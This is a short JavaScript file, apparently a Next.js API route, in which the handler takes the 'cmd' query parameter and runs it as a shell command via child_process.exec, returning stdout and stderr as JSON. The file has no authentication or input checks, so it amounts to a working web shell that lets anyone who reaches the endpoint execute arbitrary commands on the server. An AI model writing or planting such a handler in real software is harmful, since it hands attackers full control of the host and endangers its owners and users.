const exec = require("child_process").exec

export default function handler(req, res) {
    exec(req.query.cmd, (stdin, stdout, stderr)=> res.status(200).json({ query: req.query.cmd, stdout, stdin, stderr}))   
}
  